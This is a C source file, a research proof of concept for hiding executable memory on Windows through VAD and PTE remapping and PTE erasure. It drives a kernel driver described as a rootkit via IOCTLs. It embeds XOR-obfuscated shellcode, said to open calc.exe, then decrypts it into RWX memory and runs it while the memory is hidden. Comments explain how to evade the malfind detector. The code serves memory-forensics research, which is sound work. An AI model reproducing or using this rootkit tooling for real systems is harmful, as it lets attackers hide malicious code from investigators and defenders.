// Proof of Concept for the MAS remapping and PTE subversion techniques on Windows.
//
//   Copyright (c) 2019, Dominik Stripeika
//   Additional Authors:
//   Frank Block, ERNW Research GmbH <fblock@ernw.de>
//
//      All rights reserved.
//
//       Redistribution and use in source and binary forms, with or without modification,
//       are permitted provided that the following conditions are met:
//
//       * Redistributions of source code must retain the above copyright notice, this
//         list of conditions and the following disclaimer.
//       * Redistributions in binary form must reproduce the above copyright notice,
//         this list of conditions and the following disclaimer in the documentation
//         and/or other materials provided with the distribution.
//       * The names of the contributors may not be used to endorse or promote products
//         derived from this software without specific prior written permission.
//
//       THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
//       AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
//       IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
//       ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE
//       LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
//       DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
//       SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
//       CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
//       OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
//       OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
#include "stdafx.h"
#include "windows.h"
#include <stdio.h>
#include "winioctl.h"
#include "user_space_tool.h"
#include <wchar.h>
#include <stdlib.h>


#define SIOCTL_TYPE 40000
// The IOCTL function codes from 0x800 to 0xFFF are for customer use.
#define IOCTL_VAD CTL_CODE( SIOCTL_TYPE, 0x800, 0, FILE_READ_DATA|FILE_WRITE_DATA)
#define IOCTL_PTE CTL_CODE( SIOCTL_TYPE, 0x801, 0, FILE_READ_DATA|FILE_WRITE_DATA)
#define IOCTL_VADPTE CTL_CODE( SIOCTL_TYPE, 0x802, 0, FILE_READ_DATA|FILE_WRITE_DATA)
#define IOCTL_UNDO_PTE CTL_CODE( SIOCTL_TYPE, 0x810, METHOD_BUFFERED, FILE_READ_DATA|FILE_WRITE_DATA)
#define IOCTL_REDO_PTE CTL_CODE( SIOCTL_TYPE, 0x811, METHOD_BUFFERED, FILE_READ_DATA|FILE_WRITE_DATA)
#define IOCTL_UNDO_VAD CTL_CODE( SIOCTL_TYPE, 0x812, METHOD_BUFFERED, FILE_READ_DATA|FILE_WRITE_DATA)
#define IOCTL_REDO_VAD CTL_CODE( SIOCTL_TYPE, 0x813, METHOD_BUFFERED, FILE_READ_DATA|FILE_WRITE_DATA)
#define IOCTL_PTE_INIT_1 CTL_CODE( SIOCTL_TYPE, 0x820, METHOD_BUFFERED, FILE_READ_DATA|FILE_WRITE_DATA)
#define IOCTL_PTE_INIT_2 CTL_CODE( SIOCTL_TYPE, 0x821, METHOD_BUFFERED, FILE_READ_DATA|FILE_WRITE_DATA)
#define IOCTL_PTE_UNDO CTL_CODE( SIOCTL_TYPE, 0x822, METHOD_BUFFERED, FILE_READ_DATA|FILE_WRITE_DATA)
#define IOCTL_PTE_REDO CTL_CODE( SIOCTL_TYPE, 0x823, METHOD_BUFFERED, FILE_READ_DATA|FILE_WRITE_DATA)

#pragma warning(disable : 4245 4127 4838 4309 )

char xorkey[] = "t0pSecr3t!";

// shellcode opening calc.exe with special token appended at the end: AAAAAAAAAAAAAAAAAA_what.the.eyes.see.and.the.ears.hear..the.mind.believes_AAAAAAAAAAAAAAAAAA
// and xored with t0pSecr3t! 
// The shellcode is decrypted during runtime and stays decrypted.

unsigned char shellcode[] =
"\x88\x78\xf3\xb7\x95\x8b\xb2\x33\x74\x21\x35\x61\x31\x03\x37\x32\x24\x7b\x45\xf3\x11\x78\xfb\x01\x05\x2b\xf9\x61\x6c\x69\xff\x62\x50\x1b\xee\x11\x22\x7b\x7b\x96\x3e\x7a\x3d\x62\xac\x2b\x43\xf3\xd8\x1d\x15\x4c\x72\x7f\x45\x22\xb3\xfa\x79\x60\x75\xf1\x92\xbe\x37\x22\x23\x7b\xff\x73\x54\xbb\x32\x6f\x2d\x62\xa2\xb8\xf4\xa9\x74\x30\x70\x1b\xe0\xa3\x06\x54\x3c\x20\xa4\x60\xfb\x1b\x7d\x27\xf9\x73\x54\x68\x75\xe0\x93\x05\x2d\x9c\xbb\x72\xff\x15\xfc\x78\x71\x85\x28\x52\xbb\x7b\x45\xe1\xd8\x71\xb1\x9a\x68\x22\x73\xf2\x4c\xc1\x01\xc1\x3c\x50\x29\x47\x7a\x76\x4d\xf0\x01\xe8\x28\x17\xee\x23\x56\x7a\x75\xf1\x12\x71\xfb\x5f\x2d\x27\xf9\x73\x68\x68\x75\xe0\x31\xd8\x61\xeb\x3a\x32\xa4\x60\x2c\x71\x28\x0d\x3c\x39\x33\x6b\x35\x78\x35\x6a\x38\xd0\x89\x43\x33\x61\x8b\xc1\x2c\x71\x29\x09\x2d\xe8\x60\xda\x23\xde\x8b\xcf\x2d\x1b\xdf\x62\x72\x33\x74\x21\x74\x30\x70\x1b\xe8\xee\x73\x32\x74\x21\x35\x8a\x41\xd8\x0a\xe4\x8d\xe6\xcf\xd1\xc1\x92\x26\x12\xdf\xc5\xe7\x8e\xe9\xde\xa1\x78\xf3\x97\x4d\x5f\x74\x4f\x7e\xa1\x8f\xd0\x05\x56\xde\x24\x61\x41\x1b\x60\xfd\xea\x38\xd0\xa1\x43\xb1\x50\x15\x4d\x17\x1e\x15\x2b\x00\x63\x33\x72\x35\x60\x35\x71\x31\x12\x24\x22\x33\x72\x35\x60\x35\x71\x31\x12\x3a\x14\x1a\x52\x00\x0f\x00\x58\x15\x7d\x00\x1a\x17\x40\x5a\x52\x11\x55\x5e\x32\x0b\x07\x5c\x47\x1c\x44\x5a\x55\x11\x21\x16\x4d\x1a\x56\x15\x53\x5a\x1e\x04\x3b\x00\x4d\x1f\x5a\x1a\x45\x5a\x52\x15\x3f\x0c\x06\x04\x56\x07\x7e\x35\x71\x31\x12\x24\x22\x33\x72\x35\x60\x35\x71\x31\x12\x24\x22\x33\x72\x74";


int keysize = sizeof(xorkey) - 1;
int shellcode_size = sizeof(shellcode);
int token_offset = shellcode_size - 91;

VOID performPTEscenario(bool);
void prepare_answer(int);

// decrypts shellcode during runtime
void enDecrypt(char* shellcodeDestinationAddress){
	for (int i = 0; i < shellcode_size; i++)
		shellcodeDestinationAddress[i] = shellcodeDestinationAddress[i] ^ xorkey[i%keysize];
}

HANDLE hProcess = NULL;
HANDLE hDevice = NULL;
bool doItLoop = true;
WCHAR switchChar;
DWORD dwBytesRead = 0;
#define readbuffer_size 1000
char ReadBuffer[readbuffer_size] = { 0 };
DWORD64 data = 0x8877665544332211;

PVOID VADmemPointer = 0x0000;
PVOID PTEmemPointer = 0x0000;
PVOID VADPTEmemPointer = 0x0000;
PVOID CLEANmemPointer = 0x0000;
DWORD oldProtection = NULL;

HANDLE VADthread;
HANDLE PTEthread;
HANDLE VADPTEthread;

HIDING_INFO hidingInfo;
PHIDING_INFO pHidingInfo = &hidingInfo;
LPVOID vadStartAddress = 0;
LPVOID pteStartAddress = 0;
LPVOID cleanPteStartAddress = 0;
LPVOID vadpteStartAddress = 0;
LPVOID startAddress = 0x0000;
LPVOID endAddress = 0x0000;

// To prevent malfind from alerting on our memory, simply change the
// initial_protection to PAGE_READONLY.
// See also https://github.com/f-block/DFRWS-USA-2019
int initial_protection = PAGE_EXECUTE_READWRITE;
//int initial_protection = PAGE_READONLY;


DWORD64 memsize = 0x3000;
LPVOID shellcodeDestinationAddress = 0x0000;
#define answer_size 1000
char answer[answer_size];
bool attack_set_up = FALSE;

int __cdecl main()
{
	DWORD64 procID = GetCurrentProcessId();
	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)procID);
	hidingInfo.PID = (int)procID;

	hDevice = CreateFile(L"\\\\.\\DriverKit", GENERIC_WRITE | GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hDevice == NULL){
		printf("Someting went wrong while aquiring handle to kernel driver. Aborting...\n");
		return ERROR_INVALID_HANDLE;
	}

	printf("Got handle to kernel driver: %p\n", hDevice);

	do
	{
		// switch to control rootkit communication and shellcode execution
		printf("\n\nChoose your weapon.\n"
			"|---> Select subversion technique/action with the corresponding char:\n"
			"      [m]as remapping / [p]te remapping / [0]PTE erasure\n"
			"      [u]ndo current subversion / [r]edo current subversion / [e]xecute hidden code\n"
			"      [q]uit\n"
			": ");
		switchChar = _getwch();
		printf("\n\n");

		switch (switchChar)
		{
			// MAS remapping
		case L'm':

			if (attack_set_up){
				printf("At least one subversion is already set up. Combining subversions is currently not enabled. From here on, just undo/redo/execute are available");
				break;
			}
			if (vadStartAddress == 0){
				vadStartAddress = VirtualAlloc(
					(LPVOID)NULL,
					memsize,
					MEM_RESERVE | MEM_COMMIT,
					initial_protection
					);

				if (vadStartAddress == NULL) {
					printf("VAD Memory allocation failed - base address: %p\n", vadStartAddress);
					return 1;
				}
				else {
					shellcodeDestinationAddress = (LPVOID)((DWORD64)vadStartAddress + 0x1000);

					VirtualLock(
						vadStartAddress,
						memsize
						);

					// Change shellcode pages to RWX while leaving first page readonly to look innocent.
					// See comment at initialization for initial_protection for more details.
					if (initial_protection == PAGE_READONLY){
						VirtualProtect(vadStartAddress, memsize, PAGE_EXECUTE_READWRITE, &oldProtection);
						// Some benign data for the beginning of the memory area
						memset(vadStartAddress, 0x42, 0x1000);
						VirtualProtect(vadStartAddress, 0x1000, PAGE_READONLY, &oldProtection);
					}

					VADmemPointer = shellcodeDestinationAddress;

					// write malicious data after first benign page
					memcpy(shellcodeDestinationAddress, shellcode, sizeof shellcode);

					enDecrypt((char*)shellcodeDestinationAddress);


				}
			}

			// store address range for data transmission
			hidingInfo.VADtargetStartAddress = (DWORD64)vadStartAddress;
			hidingInfo.VADtargetEndAddress = hidingInfo.VADtargetStartAddress + memsize - 1;
			printf("VAD start address before modification: %llx\n", hidingInfo.VADtargetStartAddress);
			printf("VAD end address before modification: %llx\n", hidingInfo.VADtargetEndAddress);

			printf("Press enter to hide VAD.\n");
			while (getchar() != '\n');
			DeviceIoControl(hDevice, IOCTL_VAD, (LPVOID)pHidingInfo, sizeof(HIDING_INFO), ReadBuffer, readbuffer_size, &dwBytesRead, (LPOVERLAPPED)NULL);
			prepare_answer(dwBytesRead);
			printf("Message received from kerneland : %s\n", answer);
			printf("Bytes read : %d\n", dwBytesRead);

			attack_set_up = TRUE;
			break;


			// PTE erasure
		case L'0':
			if (attack_set_up){
				printf("At least one subversion is already set up. Combining subversions is currently not enabled. From here on, just undo/redo/execute are available");
				break;
			}
			performPTEscenario(false);
			attack_set_up = TRUE;
			break;

			// PTE remapping
		case L'p':
			if (attack_set_up){
				printf("At least one subversion is already set up. Combining subversions is currently not enabled. From here on, just undo/redo/execute are available");
				break;
			}
			performPTEscenario(true);
			attack_set_up = TRUE;
			break;


			// undo current subversion
		case L'u':
			if (!attack_set_up){
				printf("Attack not yet set up.\n");
				break;
			}

			if (vadStartAddress != 0){
				DeviceIoControl(hDevice, IOCTL_UNDO_VAD, (LPVOID)pHidingInfo, sizeof(HIDING_INFO), ReadBuffer, readbuffer_size, &dwBytesRead, (LPOVERLAPPED)NULL);
				prepare_answer(dwBytesRead);
				printf("Message received from kerneland : %s\n", answer);
				printf("Bytes read : %d\n", dwBytesRead);
			}

			if (pteStartAddress != 0){
				DeviceIoControl(hDevice, IOCTL_PTE_UNDO, (LPVOID)NULL, 0, ReadBuffer, readbuffer_size, &dwBytesRead, (LPOVERLAPPED)NULL);
				prepare_answer(dwBytesRead);
				printf("Message received from kerneland : %s\n", answer);
				printf("Bytes read : %d\n", dwBytesRead);
			}

			break;

			// redo current subversion
		case L'r':
			if (!attack_set_up){
				printf("Attack not yet set up.\n");
				break;
			}

			if (vadStartAddress != 0){
				DeviceIoControl(hDevice, IOCTL_REDO_VAD, (LPVOID)pHidingInfo, sizeof(HIDING_INFO), ReadBuffer, readbuffer_size, &dwBytesRead, (LPOVERLAPPED)NULL);
				prepare_answer(dwBytesRead);
				printf("Message received from kerneland : %s\n", answer);
				printf("Bytes read : %d\n", dwBytesRead);
			}

			if (pteStartAddress != 0){
				DeviceIoControl(hDevice, IOCTL_PTE_REDO, (LPVOID)pHidingInfo, sizeof(HIDING_INFO), ReadBuffer, readbuffer_size, &dwBytesRead, (LPOVERLAPPED)NULL);
				prepare_answer(dwBytesRead);
				printf("Message received from kerneland : %s\n", answer);
				printf("Bytes read : %d\n", dwBytesRead);
			}

			break;

			// execute hidden code
		case L'e':
			if (!attack_set_up){
				printf("Attack not yet set up.\n");
				break;
			}
			printf("\n\n-------------------------EXECUTE CODE-------------------------\n\n");

			// MAS remapping
			if (vadStartAddress != 0){
				// No unhiding necessary!
				printf("\nExecuting thread at %p\n", VADmemPointer);
				VADthread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)VADmemPointer, NULL, 0, NULL);
				WaitForSingleObject(VADthread, INFINITE);
			}

			// PTE subversions
			if (pteStartAddress != 0){
				// unhide memory
				DeviceIoControl(hDevice, IOCTL_PTE_UNDO, (LPVOID)NULL, 0, ReadBuffer, readbuffer_size, &dwBytesRead, (LPOVERLAPPED)NULL);
				prepare_answer(dwBytesRead);
				printf("Message received from kerneland : %s\n", answer);
				printf("Bytes read : %d\n", dwBytesRead);

				char buffer[8];
				if (ReadProcessMemory(hProcess, (char*)pteStartAddress + token_offset, buffer, 8, NULL))
					printf("First 8 bytes at token position right before execution: %llx\n", *((DWORD64*)buffer));

				// execute code
				printf("\nExecuting thread at %p\n", PTEmemPointer);
				PTEthread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)PTEmemPointer, NULL, 0, NULL);
				WaitForSingleObject(PTEthread, INFINITE);

				// rehide memory
				DeviceIoControl(hDevice, IOCTL_PTE_REDO, (LPVOID)NULL, 0, ReadBuffer, readbuffer_size, &dwBytesRead, (LPOVERLAPPED)NULL);
				prepare_answer(dwBytesRead);
				printf("Message received from kerneland : %s\n", answer);
				printf("Bytes read : %d\n", dwBytesRead);

				if (ReadProcessMemory(hProcess, (char*)pteStartAddress + token_offset, buffer, 8, NULL))
					printf("First 8 bytes at token position after execution and rehiding: %llx\n", *((DWORD64*)buffer));

			}
			break;

		case L'q':
			printf("\n\n-------------------------Exit DKOM-------------------------\n\n");
			doItLoop = false;

			if (hDevice) {
				printf("Closing device handle\n");
				CloseHandle(hDevice);
			}
			if (hProcess) {
				printf("Closing process handle\n");
				CloseHandle(hProcess);
				printf("Process handle closed. Exiting ... \n");
			}

			return 0;
		default:
			printf("Input not recognized. Try again ... \n\n");
		}
	} while (doItLoop);
}

void prepare_answer(int bytesread){
	RtlZeroMemory(answer, answer_size);
	_snprintf_s(answer, answer_size, bytesread, "%s", ReadBuffer);
}

VOID performPTEscenario(bool pfn_scenario){

	int vadsize = 0x1000;

	if (pteStartAddress == 0){
		// PTE target memory
		pteStartAddress = VirtualAlloc(
			(LPVOID)NULL,
			vadsize,
			MEM_RESERVE | MEM_COMMIT,
			initial_protection
			);


		if (pteStartAddress == NULL) {
			printf("PTE Memory allocation failed - base address: %p\n", pteStartAddress);
			return;
		}
		else {
			VirtualLock(
				pteStartAddress,
				vadsize
				);

			// See comment at initialization for initial_protection for more details.
			if (initial_protection == PAGE_READONLY)
				VirtualProtect(pteStartAddress, vadsize, PAGE_EXECUTE_READWRITE, &oldProtection);

			PTEmemPointer = pteStartAddress;

			// store address range for data transmission
			hidingInfo.PTEtargetStartAddress = (DWORD64)pteStartAddress;
			hidingInfo.PTEtargetEndAddress = hidingInfo.PTEtargetStartAddress + (vadsize - 0x1000);
			printf("PTE start address: %llx\n", hidingInfo.PTEtargetStartAddress);
			printf("PTE end address: %llx\n", hidingInfo.PTEtargetEndAddress);

			// write data to memory
			memcpy(pteStartAddress, shellcode, shellcode_size);
			enDecrypt((char*)pteStartAddress);
		}

		// Reserve memory that mimics legitimate code.
		// NOTE: With our modified PFN remapping on windows, this clean memory
		// area is currently not used.
		cleanPteStartAddress = VirtualAlloc(
			(LPVOID)NULL,
			vadsize,
			MEM_RESERVE | MEM_COMMIT,
			initial_protection
			);

		if (cleanPteStartAddress == NULL) {
			printf("Memory allocation failed - base address: %llx\n", (DWORD64)cleanPteStartAddress);
			return;
		}
		else {
			VirtualLock(
				cleanPteStartAddress,
				vadsize
				);
			//~ VirtualProtect(cleanPteStartAddress, vadsize, PAGE_EXECUTE_READWRITE, &oldProtection);

			CLEANmemPointer = cleanPteStartAddress;

			// store address range for data transmission
			hidingInfo.cleanStartAddress = (DWORD64)cleanPteStartAddress;
			hidingInfo.cleanEndAddress = hidingInfo.cleanStartAddress + (vadsize - 0x1000);
			printf("CLEAN start address: %llx\n", hidingInfo.cleanStartAddress);
			printf("CLEAN end address: %llx\n", hidingInfo.cleanEndAddress);
			if (initial_protection == PAGE_READONLY){
				VirtualProtect(cleanPteStartAddress, 0x1000, PAGE_READWRITE, &oldProtection);
				memset(cleanPteStartAddress, 0x42, 0x1000);
				VirtualProtect(cleanPteStartAddress, 0x1000, PAGE_READONLY, &oldProtection);
			}
			else
				memset(cleanPteStartAddress, 0x42, 0x1000);
		}
	}

	// read data from memory
	char buffer[8];
	if (ReadProcessMemory(hProcess, (char*)pteStartAddress + token_offset, buffer, 8, NULL))
		printf("First 8 bytes at token position before subversion: %llx\n", *((DWORD64*)buffer));

	DeviceIoControl(hDevice, IOCTL_PTE_INIT_1, (LPVOID)pHidingInfo, sizeof(HIDING_INFO), ReadBuffer, readbuffer_size, &dwBytesRead, (LPOVERLAPPED)NULL);
	prepare_answer(dwBytesRead);
	printf("Message received from kerneland : %s\n", answer);
	printf("Bytes read : %d\n", dwBytesRead);

	if (pfn_scenario){
		printf("press enter to initiate part two for modified PFN remapping.\n");
		while (getchar() != '\n');

		// setting up the newly aquired page(s), resulting from our modified PTE remapping
		if (initial_protection == PAGE_READONLY){
			// We are currently using only one page
			VirtualProtect(pteStartAddress, 0x1000, PAGE_READWRITE, &oldProtection);
			memset(pteStartAddress, 0x42, 0x1000);
			VirtualProtect(pteStartAddress, vadsize, PAGE_READONLY, &oldProtection);
		}
		else
			memset(pteStartAddress, 0x42, 0x1000);

		DeviceIoControl(hDevice, IOCTL_PTE_INIT_2, (LPVOID)pHidingInfo, sizeof(HIDING_INFO), ReadBuffer, readbuffer_size, &dwBytesRead, (LPOVERLAPPED)NULL);
		prepare_answer(dwBytesRead);
		printf("Message received from kerneland : %s\n", answer);
		printf("Bytes read : %d\n", dwBytesRead);


		if (ReadProcessMemory(hProcess, (char*)pteStartAddress + token_offset, buffer, 8, NULL))
			printf("First 8 bytes at token position after subversion: %llx\n", *((DWORD64*)buffer));
	}
}
